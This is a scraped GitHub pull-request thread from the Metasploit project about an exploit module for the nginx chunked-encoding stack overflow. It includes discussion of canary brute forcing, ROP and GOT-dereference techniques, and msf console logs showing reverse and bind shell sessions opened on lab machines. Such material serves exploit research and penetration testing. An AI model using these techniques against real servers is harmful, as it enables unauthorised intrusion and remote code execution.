=== Content from github.com_e3da35eb_20250125_014430.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Frapid7%2Fmetasploit-framework%2Fpull%2F1834)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Frapid7%2Fmetasploit-framework%2Fpull%2F1834)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fpull_requests_fragments%2Fpull_request_layout&source=header-repo&source_repo=rapid7%2Fmetasploit-framework)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[rapid7](/rapid7)
/
**[metasploit-framework](/rapid7/metasploit-framework)**
Public

* [Notifications](/login?return_to=%2Frapid7%2Fmetasploit-framework) You must be signed in to change notification settings
* [Fork
  14.1k](/login?return_to=%2Frapid7%2Fmetasploit-framework)
* [Star
   34.6k](/login?return_to=%2Frapid7%2Fmetasploit-framework)

* [Code](/rapid7/metasploit-framework)
* [Issues
  412](/rapid7/metasploit-framework/issues)
* [Pull requests
  40](/rapid7/metasploit-framework/pulls)
* [Discussions](/rapid7/metasploit-framework/discussions)
* [Actions](/rapid7/metasploit-framework/actions)
* [Projects
  1](/rapid7/metasploit-framework/projects)
* [Wiki](/rapid7/metasploit-framework/wiki)
* [Security](/rapid7/metasploit-framework/security)
* [Insights](/rapid7/metasploit-framework/pulse)

Additional navigation options

* [Code](/rapid7/metasploit-framework)
* [Issues](/rapid7/metasploit-framework/issues)
* [Pull requests](/rapid7/metasploit-framework/pulls)
* [Discussions](/rapid7/metasploit-framework/discussions)
* [Actions](/rapid7/metasploit-framework/actions)
* [Projects](/rapid7/metasploit-framework/projects)
* [Wiki](/rapid7/metasploit-framework/wiki)
* [Security](/rapid7/metasploit-framework/security)
* [Insights](/rapid7/metasploit-framework/pulse)

New issue

**Have a question about this project?** Sign up for a free GitHub account to open an issue and contact its maintainers and the community.

 [Sign up for GitHub](/signup?return_to=%2Frapid7%2Fmetasploit-framework%2Fissues%2Fnew%2Fchoose)

By clicking “Sign up for GitHub”, you agree to our [terms of service](https://docs.github.com/terms) and
[privacy statement](https://docs.github.com/privacy). We’ll occasionally send you account related emails.

Already on GitHub?
[Sign in](/login?return_to=%2Frapid7%2Fmetasploit-framework%2Fissues%2Fnew%2Fchoose)
to your account

[Jump to bottom](#issue-comment-box)

# Exploit module for nginx chunked stack buffer overflow. #1834

 Closed

[hal3002](/hal3002)
wants to merge
16
commits into
[rapid7:master](/rapid7/metasploit-framework/tree/master "rapid7/metasploit-framework:master")
from
hal3002:master

 Closed

# [Exploit module for nginx chunked stack buffer overflow.](#top) #1834

[hal3002](/hal3002)
wants to merge
16
commits into
[rapid7:master](/rapid7/metasploit-framework/tree/master "rapid7/metasploit-framework:master")
from
hal3002:master

[Conversation
35](/rapid7/metasploit-framework/pull/1834)
[Commits
16](/rapid7/metasploit-framework/pull/1834/commits)
[Checks
0](/rapid7/metasploit-framework/pull/1834/checks)
[Files changed](/rapid7/metasploit-framework/pull/1834/files)

## Conversation

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

[![hal3002](https://avatars.githubusercontent.com/u/82838?s=60&v=4)](/hal3002)

Copy link

Contributor

### @hal3002 **[hal3002](/hal3002)** commented [May 15, 2013](#issue-14377802)

This is an exploit module for the chunked encoding stack buffer overflow vulnerability in nginx 1.3.9 and 1.4.0. It also includes a ropdb xml file for the exploit with targets for Kali 1.0 (my dev environment) and RHEL 6.4 using the installed libc for both targets.

Sorry, something went wrong.

All reactions

 [hal3002](/hal3002)
added 2 commits
[May 15, 2013 15:50](#commits-pushed-02246c1)

[![@hal3002](https://avatars.githubusercontent.com/u/82838?s=40&v=4)](/hal3002)

`[Adding exploit module and rop chain xml file for nginx chunk exploit](/rapid7/metasploit-framework/pull/1834/commits/02246c1a95333cddf2d448164c78a9c3007e3466 "Adding exploit module and rop chain xml file for nginx chunk exploit")`

`[02246c1](/rapid7/metasploit-framework/pull/1834/commits/02246c1a95333cddf2d448164c78a9c3007e3466)`

[![@hal3002](https://avatars.githubusercontent.com/u/82838?s=40&v=4)](/hal3002)

`[Realized this doesnt need to be sent twice](/rapid7/metasploit-framework/pull/1834/commits/f9ae46fbcdac173d10f4ed871be01b8fcddccf6b "Realized this doesnt need to be sent twice")`

`[f9ae46f](/rapid7/metasploit-framework/pull/1834/commits/f9ae46fbcdac173d10f4ed871be01b8fcddccf6b)`

[![@saelo](https://avatars.githubusercontent.com/u/2453290?s=80&u=7ad4e1d6fe0cc7f52e70cdc960043801eea1eef4&v=4)](/saelo)

Copy link

### **[saelo](/saelo)** commented [May 15, 2013](#issuecomment-17967195)

| Hi, I was playing around with that vuln, too. On my Systems (Ubuntu 13.04 and Debian 7) I also need to bypass stack protection (I compiled from source, but all packages I got from repos had stack protection enabled as well), your exploit doesn't seem to do this yet. Also versions 1.3.10-16 are vulnerable, too. Maybe we could work on this together, add more targets and see if we can bypass stack protection? |
| --- |

All reactions

Sorry, something went wrong.

[![@hal3002](https://avatars.githubusercontent.com/u/82838?s=80&v=4)](/hal3002)

Copy link

Contributor

Author

### **[hal3002](/hal3002)** commented [May 16, 2013](#issuecomment-18000169)

| I'd definitely be willing to give it a go. I actually started looking at Ubuntu 12.04 LTS after sending this request and noticed the same thing. I'll try to take more of a look at it this weekend unless someone has already found a solution. |
| --- |

All reactions

Sorry, something went wrong.

 Samuel Groß
and others
added 4 commits
[May 16, 2013 19:00](#commits-pushed-4d8000f)

`[Small changes.](/rapid7/metasploit-framework/pull/1834/commits/4d8000fd6186d916e20056c4b0587df1df5e4fcb "Small changes.")`

`[4d8000f](/rapid7/metasploit-framework/pull/1834/commits/4d8000fd6186d916e20056c4b0587df1df5e4fcb)`

[![@hal3002](https://avatars.githubusercontent.com/u/82838?s=40&v=4)](/hal3002)

`[Merge pull request](/rapid7/metasploit-framework/pull/1834/commits/716472798984ab32be2a04478e986d64d9f82f01 "Merge pull request #1 from saelo/master

Small Changes") [#1](https://github.com/rapid7/metasploit-framework/issues/1) [from saelo/master](/rapid7/metasploit-framework/pull/1834/commits/716472798984ab32be2a04478e986d64d9f82f01 "Merge pull request #1 from saelo/master

Small Changes")`
 …

`[7164727](/rapid7/metasploit-framework/pull/1834/commits/716472798984ab32be2a04478e986d64d9f82f01)`

```
Small Changes
```

[![@hal3002](https://avatars.githubusercontent.com/u/82838?s=40&v=4)](/hal3002)

`[Removing StackCanary options until we have it working and cleaning up…](/rapid7/metasploit-framework/pull/1834/commits/fc2512e4bff61148d6e132b11c0fb61c4e2c0a60 "Removing StackCanary options until we have it working and cleaning up based on msftidy warnings")`
 …

`[fc2512e](/rapid7/metasploit-framework/pull/1834/commits/fc2512e4bff61148d6e132b11c0fb61c4e2c0a60)`

```
… based on msftidy warnings
```

[![@hal3002](https://avatars.githubusercontent.com/u/82838?s=40&v=4)](/hal3002)

`[Adding Ubuntu 13.04 target and the ability to quickly bruteforce the …](/rapid7/metasploit-framework/pull/1834/commits/120c7ad928cd48866128a2b6427ef2067bff5b3a "Adding Ubuntu 13.04 target and the ability to quickly bruteforce the stack canary value on targets with stack canaries")`
 …

`[120c7ad](/rapid7/metasploit-framework/pull/1834/commits/120c7ad928cd48866128a2b6427ef2067bff5b3a)`

```
…stack canary value on targets with stack canaries
```

[![@hal3002](https://avatars.githubusercontent.com/u/82838?s=80&v=4)](/hal3002)

Copy link

Contributor

Author

### **[hal3002](/hal3002)** commented [May 17, 2013](#issuecomment-18042321)

| Running against a fully updated Ubuntu 13.04 against 1.4.0 compiled from source: [*] Searching for stack canary [*] Bruteforcing byte 1 [\*] Byte 1 found: 0x79  [*] Bruteforcing byte 2 [*] Byte 2 found: 0x27  [*] Bruteforcing byte 3 [*] Byte 3 found: 0xde  [\*] Canary found: 0xde277900  [*] Sending 2048 byte payload at base 0xb7470000 [*] Sending 2048 byte payload at base 0xb7471000 [*] Sending 2048 byte payload at base 0xb7472000 [*] Sending 2048 byte payload at base 0xb7473000 [*] Sending 2048 byte payload at base 0xb7474000 [*] Sending 2048 byte payload at base 0xb7475000 [*] Sending 2048 byte payload at base 0xb7476000 [*] Sending 2048 byte payload at base 0xb7477000 [*] Sending 2048 byte payload at base 0xb7478000 [*] Sending 2048 byte payload at base 0xb7479000 [*] Sending 2048 byte payload at base 0xb747a000 [*] Sending 2048 byte payload at base 0xb747b000 [*] Sending 2048 byte payload at base 0xb747c000 [*] Sending 2048 byte payload at base 0xb747d000 [*] Sending 2048 byte payload at base 0xb747e000 [*] Sending 2048 byte payload at base 0xb747f000 [*] Sending 2048 byte payload at base 0xb7480000 [*] Sending 2048 byte payload at base 0xb7481000 [*] Sending 2048 byte payload at base 0xb7482000 [*] Sending 2048 byte payload at base 0xb7483000 [*] Sending 2048 byte payload at base 0xb7484000 [*] Sending 2048 byte payload at base 0xb7485000 [*] Sending 2048 byte payload at base 0xb7486000 [*] Sending 2048 byte payload at base 0xb7487000 [*] Sending 2048 byte payload at base 0xb7488000 [*] Sending 2048 byte payload at base 0xb7489000 [*] Sending 2048 byte payload at base 0xb748a000 [*] Sending 2048 byte payload at base 0xb748b000 [*] Sending 2048 byte payload at base 0xb748c000 [*] Sending 2048 byte payload at base 0xb748d000 [*] Sending 2048 byte payload at base 0xb748e000 [*] Sending 2048 byte payload at base 0xb748f000 [*] Sending 2048 byte payload at base 0xb7490000 [*] Sending 2048 byte payload at base 0xb7491000 [*] Sending 2048 byte payload at base 0xb7492000 [*] Sending 2048 byte payload at base 0xb7493000 [*] Sending 2048 byte payload at base 0xb7494000 [*] Sending 2048 byte payload at base 0xb7495000 [*] Sending stage (36 bytes) to 192.168.1.19 [*] Command shell session 11 opened (192.168.1.114:5353 -> 192.168.1.19:42020) at 2013-05-16 23:20:08 -0400 ps PID TTY TIME CMD 12769 ? 00:00:00 sh 12770 ? 00:00:00 ps |
| --- |

All reactions

Sorry, something went wrong.

[![@hal3002](https://avatars.githubusercontent.com/u/82838?s=40&v=4)](/hal3002)

`[Screwed up the offset for the Kali test box last night](/rapid7/metasploit-framework/pull/1834/commits/c99a51aada0b45ccdaa5559a25b0990c190b7a65 "Screwed up the offset for the Kali test box last night")`

`[c99a51a](/rapid7/metasploit-framework/pull/1834/commits/c99a51aada0b45ccdaa5559a25b0990c190b7a65)`

[![@hal3002](https://avatars.githubusercontent.com/u/82838?s=80&v=4)](/hal3002)

Copy link

Contributor

Author

### **[hal3002](/hal3002)** commented [May 17, 2013](#issuecomment-18063816)

| Normally I do, but currently that causes it to fail. I figured I would get it up here and then deal with that later. As far as detection, most devices are going to alert on the screwed up chunk size. |
| --- |

All reactions

Sorry, something went wrong.

 Samuel Groß
and others
added 9 commits
[May 18, 2013 14:23](#commits-pushed-3538081)

`[Added options to set the canary and libc base](/rapid7/metasploit-framework/pull/1834/commits/3538081a121d5e0b438dcc067f450b03df911807 "Added options to set the canary and libc base")`

`[3538081](/rapid7/metasploit-framework/pull/1834/commits/3538081a121d5e0b438dcc067f450b03df911807)`

[![@hal3002](https://avatars.githubusercontent.com/u/82838?s=40&v=4)](/hal3002)

`[Merge pull request](/rapid7/metasploit-framework/pull/1834/commits/2d396a77d268185851a86a7e91b3c8e15e36209c "Merge pull request #2 from saelo/master

Added Options for libc base and canary") [#2](https://github.com/rapid7/metasploit-framework/pull/2) [from saelo/master](/rapid7/metasploit-framework/pull/1834/commits/2d396a77d268185851a86a7e91b3c8e15e36209c "Merge pull request #2 from saelo/master

Added Options for libc base and canary")`
 …

`[2d396a7](/rapid7/metasploit-framework/pull/1834/commits/2d396a77d268185851a86a7e91b3c8e15e36209c)`

```
Added Options for libc base and canary
```

[![@hal3002](https://avatars.githubusercontent.com/u/82838?s=40&v=4)](/hal3002)

`[Fixing offsets up based on RHOST length and cleaning up indentation](/rapid7/metasploit-framework/pull/1834/commits/196cc8d056e9b4cb117f75ae4567bfb0787c1381 "Fixing offsets up based on RHOST length and cleaning up indentation")`

`[196cc8d](/rapid7/metasploit-framework/pull/1834/commits/196cc8d056e9b4cb117f75ae4567bfb0787c1381)`

[![@hal3002](https://avatars.githubusercontent.com/u/82838?s=40&v=4)](/hal3002)

`[I think I fixed the random buffer issue](/rapid7/metasploit-framework/pull/1834/commits/cf6f026e1b75be4b6aa4ac10808dddc9ae69954e "I think I fixed the random buffer issue")`

`[cf6f026](/rapid7/metasploit-framework/pull/1834/commits/cf6f026e1b75be4b6aa4ac10808dddc9ae69954e)`

[![@hal3002](https://avatars.githubusercontent.com/u/82838?s=40&v=4)](/hal3002)

`[Really fixed it this time](/rapid7/metasploit-framework/pull/1834/commits/19c7edd0975d6a0f57a34fff88c5d3ce9e4d6290 "Really fixed it this time")`

`[19c7edd](/rapid7/metasploit-framework/pull/1834/commits/19c7edd0975d6a0f57a34fff88c5d3ce9e4d6290)`

[![@hal3002](https://avatars.githubusercontent.com/u/82838?s=40&v=4)](/hal3002)

`[Fixed stability issues related to UA and Host fields by sending the r…](/rapid7/metasploit-framework/pull/1834/commits/7d2e3b32c50c08cc49ad1fc41cca28c169e47f9e "Fixed stability issues related to UA and Host fields by sending the request by hand and updated all offsets for targets")`
 …

`[7d2e3b3](/rapid7/metasploit-framework/pull/1834/commits/7d2e3b32c50c08cc49ad1fc41cca28c169e47f9e)`

```
…equest by hand and updated all offsets for targets
```

[![@hal3002](https://avatars.githubusercontent.com/u/82838?s=40&v=4)](/hal3002)

`[Adding options for RPORT since we are no longer using the http client…](/rapid7/metasploit-framework/pull/1834/commits/8d57ed641567cf4ffad416fd31e9e7029ead8949 "Adding options for RPORT since we are no longer using the http client libraries and fixing version check")`
 …

`[8d57ed6](/rapid7/metasploit-framework/pull/1834/commits/8d57ed641567cf4ffad416fd31e9e7029ead8949)`

```
… libraries and fixing version check
```

`[Added new target: Debian Squeeze](/rapid7/metasploit-framework/pull/1834/commits/2482a5de4a8b3d2773427882a3c257bddc479d64 "Added new target: Debian Squeeze")`

`[2482a5d](/rapid7/metasploit-framework/pull/1834/commits/2482a5de4a8b3d2773427882a3c257bddc479d64)`

[![@hal3002](https://avatars.githubusercontent.com/u/82838?s=40&v=4)](/hal3002)

`[Merge pull request](/rapid7/metasploit-framework/pull/1834/commits/3a2256ac2d9b59508184c5fb2c278a2313909fde "Merge pull request #3 from saelo/master

New target: Debian Squeeze") [#3](https://github.com/rapid7/metasploit-framework/pull/3) [from saelo/master](/rapid7/metasploit-framework/pull/1834/commits/3a2256ac2d9b59508184c5fb2c278a2313909fde "Merge pull request #3 from saelo/master

New target: Debian Squeeze")`
 …

`[3a2256a](/rapid7/metasploit-framework/pull/1834/commits/3a2256ac2d9b59508184c5fb2c278a2313909fde)`

```
New target: Debian Squeeze
```

[![@jvazquez-r7](https://avatars.githubusercontent.com/u/1742838?s=80&v=4)](/jvazquez-r7)

Copy link

Contributor

### **[jvazquez-r7](/jvazquez-r7)** commented [May 22, 2013](#issuecomment-18252745)

| Hi [@saelo](https://github.com/saelo) and @linuxgeek247 . It s an awesome contribution! Thank you very much! I couldn't resist to join this collaboration effort if you don't mind :$  Tried a GOT dereferencing attack in order to avoid the libc brute forcing attack. Since nginx compiles with NO PIE by default looks like a good approach in order to avoid the brute force attack.  I've implemented it for nginx 1.4.0 compiled (default options) on Debian Squeeze. It's available on this branch so you can give it a look and share your opinion:  <https://github.com/jvazquez-r7/metasploit-framework/commits/nginx_got_dereferencing>  The commit for my mod module is also here:  [jvazquez-r7@811ed7f](https://github.com/jvazquez-r7/metasploit-framework/commit/811ed7f5000604e9f59e8cc2e77b24eb5f847f81)  The module working:  ```  msf exploit(nginx_chunked_size_no_brute) > set PAYLOAD cmd/unix/reverse PAYLOAD => cmd/unix/reverse msf exploit(nginx_chunked_size_no_brute) > set LHOST 192.168.172.1 LHOST => 192.168.172.1 msf exploit(nginx_chunked_size_no_brute) > rexploit [*] Reloading module...  [-] Exploit failed: No NOP generators succeeded. msf exploit(nginx_chunked_size_no_brute) > rexploit [*] Reloading module...  [*] 192.168.172.200:80 - Sending 523 byte payload [*] Started reverse double handler [*] Accepted the first client connection... [*] Accepted the second client connection... [*] Command: echo 1tNBEwk5zjp3wvoy; [*] Writing to socket A [*] Writing to socket B [*] Reading from sockets... [*] Reading from socket B [*] B: "1tNBEwk5zjp3wvoy\r\n" [*] Matching... [*] A is input... [*] Command shell session 1 opened (192.168.172.1:4444 -> 192.168.172.200:53788) at 2013-05-21 20:14:44 -0500  id uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)   ```  What do you think? I must to admit in my opinion the exploit is more reliable using the GOT dereference over the brute force attack. So if you agree we could migrate the current module to use this technique. Or maybe mix targets and allow both GOT dereferencing and brute force attack :)  Again, thanks very much for the effort! It's kinda awesome. |
| --- |

All reactions

Sorry, something went wrong.

[![@hal3002](https://avatars.githubusercontent.com/u/82838?s=80&v=4)](/hal3002)

Copy link

Contributor

Author

### **[hal3002](/hal3002)** commented [May 22, 2013](#issuecomment-18278204)

| It's definitely much faster. I never actually thought to do that but it makes sense. The only thing I'm fuzzy on is the purpose of using the offset between localtime\_r to system. What's the purpose of that versus just using the system got address? Thanks very much. This should simplify things greatly. |
| --- |

All reactions

Sorry, something went wrong.

[![@hal3002](https://avatars.githubusercontent.com/u/82838?s=80&v=4)](/hal3002)

Copy link

Contributor

Author

### **[hal3002](/hal3002)** commented [May 22, 2013](#issuecomment-18280913)

| Scratch that. I see what you are doing. I just couldn't figure out what the point of the 0x5d5b14c4 was for. |
| --- |

All reactions

Sorry, something went wrong.

[![@jvazquez-r7](https://avatars.githubusercontent.com/u/1742838?s=80&v=4)](/jvazquez-r7)

Copy link

Contributor

### **[jvazquez-r7](/jvazquez-r7)** commented [May 22, 2013](#issuecomment-18285200)

| @linuxgeek247 there isn't system in the nginx GOT, because of that we're using the localtime\_r one and calculating the system address having into account the libc offset.  The 0x5d5b14c4 offset is because of the "add eax, [ebx+0x5d5b14c4] # ret" gadget. This gadget allows to get on eax the system address if you previously have the localtime\_r address (you can get it from the nginx got) and the offset (it's libc specific, so target specific, not a big deal because the curent exploit is also target specific when leaking the libc address) :)  I'm going to work on this today, would like to merge both approaches, brute forcing targets and got dereferencing targets, and land one first version into the framework! :)  Seriously, kinda awesome work guys! :) |
| --- |

All reactions

Sorry, something went wrong.

[![@hal3002](https://avatars.githubusercontent.com/u/82838?s=80&v=4)](/hal3002)

Copy link

Contributor

Author

### **[hal3002](/hal3002)** commented [May 22, 2013](#issuecomment-18285472)

| I'm actually migrating your got approach for Ubuntu right now. The only difference is the canary bruteforce. Just finishing up the store function now. Would it be better to create rop xml files for this or just store them in the target hash since they are so much smaller? |
| --- |

All reactions

Sorry, something went wrong.

[![@jvazquez-r7](https://avatars.githubusercontent.com/u/1742838?s=80&v=4)](/jvazquez-r7)

Copy link

Contributor

### **[jvazquez-r7](/jvazquez-r7)** commented [May 22, 2013](#issuecomment-18286244)

| Hi @linuxgeek247 I think storing them in the target hash would be better in this case :) Oka, I wait to your new version and then will work on cleaning it if necessary before merging! thanks @linuxgeek247 !!! Kinda hard work! Just ping me if you need help while coding it. Also, I'm available at freenode, metasploit channel, in case you would like to discuss any detail! |
| --- |

All reactions

Sorry, something went wrong.

[![@jvazquez-r7](https://avatars.githubusercontent.com/u/1742838?s=80&v=4)](/jvazquez-r7)

Copy link

Contributor

### **[jvazquez-r7](/jvazquez-r7)** commented [May 22, 2013](#issuecomment-18286319)

| Or better, ad a function for generating the rop for every target, and in the target hash meta information, just keep a callback to the correct function to call when generating the rop :). Since ROP chains for these approachs are smaller I feel comfortable adding them in the code. |
| --- |

All reactions

Sorry, something went wrong.

[![@hal3002](https://avatars.githubusercontent.com/u/82838?s=80&v=4)](/hal3002)

Copy link

Contributor

Author

### **[hal3002](/hal3002)** commented [May 22, 2013](#issuecomment-18292973)

| I've got everything updated now. I've removed RHEL and Cali for now. I'm going to close this pull request and open a clean request. |
| --- |

All reactions

Sorry, something went wrong.

[![@hal3002](https://avatars.githubusercontent.com/u/82838?s=40&v=4)](/hal3002)
[hal3002](/hal3002)
closed this
[May 22, 2013](#event-49789218)

[![@jvazquez-r7](https://avatars.githubusercontent.com/u/1742838?s=80&v=4)](/jvazquez-r7)

Copy link

Contributor

### **[jvazquez-r7](/jvazquez-r7)** commented [May 22, 2013](#issuecomment-18293869)

| Sounds good, can't wait to look into it and hopefully merge :) |
| --- |

All reactions

Sorry, something went wrong.

[![@danghvu](https://avatars.githubusercontent.com/u/1152714?s=80&u=eda7abfb852c133a085f1a7a4ca73ef3f3b04b28&v=4)](/danghvu)

Copy link

### **[danghvu](/danghvu)** commented [May 22, 2013](#issuecomment-18312442)

| I believe there is an `execve` in `nginx`, can't you use it directly instead of a calculated `system` ? |
| --- |

All reactions

Sorry, something went wrong.

[![@jvazquez-r7](https://avatars.githubusercontent.com/u/1742838?s=80&v=4)](/jvazquez-r7)

Copy link

Contributor

### **[jvazquez-r7](/jvazquez-r7)** commented [May 23, 2013](#issuecomment-18354418)

| Not directly I guess but opens the door to a possible ROP shellcode :) |
| --- |

All reactions

Sorry, something went wrong.

[![@niubl](https://avatars.githubusercontent.com/u/4416142?s=80&v=4)](/niubl)

Copy link

### **[niubl](/niubl)** commented [May 24, 2013](#issuecomment-18395729)

| i compile nginx 1.4.0 on kaili 1.0 and ubuntu 12.04,then i test this exp,but it does not work. who guys can tell how to make a vulnerable evironment? my email:448354223@qq.com . think you very much. |
| --- |

All reactions

Sorry, something went wrong.

[![@saelo](https://avatars.githubusercontent.com/u/2453290?s=80&u=7ad4e1d6fe0cc7f52e70cdc960043801eea1eef4&v=4)](/saelo)

Copy link

### **[saelo](/saelo)** commented [May 24, 2013](#issuecomment-18397826)

| currently available targets are debian squeeze and ubuntu 13.04 (both 32bit), can you try one of those and see if it works for you? |
| --- |

All reactions

Sorry, something went wrong.

[![@niubl](https://avatars.githubusercontent.com/u/4416142?s=80&v=4)](/niubl)

Copy link

### **[niubl](/niubl)** commented [May 25, 2013](#issuecomment-18445548)

| [@saelo](https://github.com/saelo) i test ubuntu 13.04 today,but i failt to exploit by use nginx 1.4.0.is there some other config needed to do during compile nginx? |
| --- |

All reactions

Sorry, something went wrong.

[![@saelo](https://avatars.githubusercontent.com/u/2453290?s=80&u=7ad4e1d6fe0cc7f52e70cdc960043801eea1eef4&v=4)](/saelo)

Copy link

### **[saelo](/saelo)** commented [May 25, 2013](#issuecomment-18445694)

| [@niubl](https://github.com/niubl) Ok, interesting. You compiled the version from their mercurial repository? The ROP gadgets in the current exploit didn't work for me either (apparently for the others though), can you check if my version works for you? You can find it here: <https://github.com/saelo/metasploit-framework/commit/b06061240a6712a19382be5a8c911be4a764188f> Just download the new file and replace it in your copy of msf. If that still does not work you can send me a copy of your nginx executable (objs/nginx) so I can take a look at it. |
| --- |

All reactions

Sorry, something went wrong.

[![@niubl](https://avatars.githubusercontent.com/u/4416142?s=80&v=4)](/niubl)

Copy link

### **[niubl](/niubl)** commented [May 25, 2013](#issuecomment-18446591)

| [@saelo](https://github.com/saelo) this my steps: ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++ msf exploit(nginx\_chunked\_size) > set payload generic/shell\_bind\_tcp payload => generic/shell\_bind\_tcp msf exploit(nginx\_chunked\_size) > show options  Module options (exploit/linux/http/nginx\_chunked\_size):  Name Current Setting Required Description   ---   RHOST 10.1.11.3 yes The target address RPORT 80 yes The remote HTTP server port  Payload options (generic/shell\_bind\_tcp):  Name Current Setting Required Description   ---   LPORT 9999 yes The listen port RHOST 10.1.11.3 no The target address  Exploit target:  Id Name   ---   0 Ubuntu 13.04 32bit - nginx 1.4.0  msf exploit(nginx\_chunked\_size) > exploit  [*] Started bind handler [*] 10.1.11.3:80 - Searching for stack canary [*] 10.1.11.3:80 - Assuming byte 0 0x00 [*] 10.1.11.3:80 - Bruteforcing byte 1 [+] 10.1.11.3:80 - Byte 1 found: 0x3c [*] 10.1.11.3:80 - Bruteforcing byte 2 [+] 10.1.11.3:80 - Byte 2 found: 0x3a [*] 10.1.11.3:80 - Bruteforcing byte 3 [+] 10.1.11.3:80 - Byte 3 found: 0xb5 [+] 10.1.11.3:80 - Canary found: 0xb53a3c00  msf exploit(nginx\_chunked\_size) > sessions Active sessions No active sessions. ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++ can you give you email? i will send you my nginx source whick i tested. |
| --- |

All reactions

Sorry, something went wrong.

[![@saelo](https://avatars.githubusercontent.com/u/2453290?s=80&u=7ad4e1d6fe0cc7f52e70cdc960043801eea1eef4&v=4)](/saelo)

Copy link

### **[saelo](/saelo)** commented [May 25, 2013](#issuecomment-18450413)

| You can find me in the metasploit IRC channel (with this nick), lets talk there :) |
| --- |

All reactions

Sorry, something went wrong.

[![@inode-](https://avatars.githubusercontent.com/u/4608466?s=80&u=f9aabfc3feef2a874213955b88d22bdfc417340b&v=4)](/inode-)

Copy link

### **[inode-](/inode-)** commented [Jun 4, 2013](#issuecomment-18892809)

| I'm getting the sames problems as niubl, downloaded and installed version 1.4.0, tryed to exploit but failt with official module and saelo one (working on ubuntu 13.04 32bit). Any compiler options needed? |
| --- |

All reactions

Sorry, something went wrong.

[![@saelo](https://avatars.githubusercontent.com/u/2453290?s=80&u=7ad4e1d6fe0cc7f52e70cdc960043801eea1eef4&v=4)](/saelo)

Copy link

### **[saelo](/saelo)** commented [Jun 4, 2013](#issuecomment-18903520)

| [@inode-](https://github.com/inode-) can you meet me in IRC, too? No special compiler options should be needed. |
| --- |

All reactions

Sorry, something went wrong.

[![@inode-](https://avatars.githubusercontent.com/u/4608466?s=80&u=f9aabfc3feef2a874213955b88d22bdfc417340b&v=4)](/inode-)

Copy link

### **[inode-](/inode-)** commented [Jun 4, 2013](#issuecomment-18906749)

| [@saelo](https://github.com/saelo) I'm in, nickname odfijoisjsodifjs |
| --- |

All reactions

Sorry, something went wrong.

[![@saelo](https://avatars.githubusercontent.com/u/2453290?s=80&u=7ad4e1d6fe0cc7f52e70cdc960043801eea1eef4&v=4)](/saelo)

Copy link

### **[saelo](/saelo)** commented [Jun 4, 2013](#issuecomment-18909124)

| General Announcement If you are having trouble getting the exploit to work please make sure you compile with support for pcre and zlib by installing libpcre++-dev and zlib1g-dev in ubuntu :) |
| --- |

All reactions

Sorry, something went wrong.

[![@targetnull](https://avatars.githubusercontent.com/u/7612103?s=80&v=4)](/targetnull)

Copy link

### **[targetnull](/targetnull)** commented [Aug 16, 2016](#issuecomment-239996196) • edited Loading

